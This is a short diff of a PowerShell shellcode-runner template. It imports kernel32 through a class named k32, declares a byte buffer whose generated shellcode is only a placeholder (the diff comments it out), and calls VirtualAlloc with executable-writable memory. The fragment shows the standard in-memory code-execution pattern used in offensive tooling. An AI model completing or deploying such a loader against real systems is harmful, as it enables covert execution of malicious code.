@@ -14,7 +14,7 @@ public class k32{
 
 Add-Type $k32
 
-[Byte[]] $buf = <generated_ps1_shellcode>
+[Byte[]] $buf =  #<generated_ps1_shellcode>
 
 $size = $buf.Length
 [IntPtr]$addr = [k32]::VirtualAlloc(0,$size,0x3000,0x40);
